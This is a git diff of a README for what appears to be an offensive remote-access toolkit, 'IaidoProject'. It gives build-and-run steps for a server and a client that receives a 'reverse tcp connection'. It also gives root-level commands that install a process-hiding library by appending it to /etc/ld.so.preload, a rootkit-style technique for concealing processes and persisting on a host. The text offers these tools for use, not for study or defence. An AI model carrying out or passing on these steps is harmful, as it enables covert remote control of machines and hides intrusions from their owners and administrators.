@@ -20,10 +20,8 @@ git clone https://github.com/T0k1To/IaidoProject
 </p>
 
 ```bash
-cd IaidoProject
-```
-```bash
-go run IaidoSV.go
+make server
+bin/IaidoSV
 ```
 ---
 
@@ -32,13 +30,8 @@ go run IaidoSV.go
 </p>
 
 ```bash
-cd IaidoProject
-```
-```bash
-cd bin
-```
-```bash
-./Iaido
+make client
+bin/Iaido
 ```
 - Wait to load and insert your ip to receive the reverse tcp connection and enjoy =]
 ---
@@ -53,18 +46,9 @@ cd bin
 	processhider.c Usage:
 </p>
 
-`With root proceed:`
-
 ```bash
-cd IaidoProject
-```
-```bash
-make
-```
-```bash
-sudo mv libprocesshider.so /usr/local/lib/
-```
-```bash
+make libprocesshider
+~# mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 ```
 
